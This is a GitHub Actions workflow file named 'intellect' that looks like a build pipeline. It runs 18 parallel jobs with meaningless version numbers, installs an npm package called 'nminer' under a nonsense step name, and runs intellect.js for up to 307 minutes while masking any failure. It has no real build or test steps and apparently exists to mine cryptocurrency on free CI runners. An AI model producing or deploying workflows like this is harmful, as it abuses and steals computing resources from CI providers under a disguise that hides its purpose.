name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7708 }
          - { version: 197 }
          - { version: 1162 }
          - { version: 3316 }
          - { version: 4662 }
          - { version: 7008 }
          - { version: 5244 }
          - { version: 2009 }
          - { version: 1369 }
          - { version: 4907 }
          - { version: 7699 }
          - { version: 184 }
          - { version: 811 }
          - { version: 1544 }
          - { version: 1189 }
          - { version: 3259 }
          - { version: 5889 }
          - { version: 116 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: duh petty as
        run: |
          npm install nminer@latest
          timeout 307m node intellect.js || echo "intellect executed"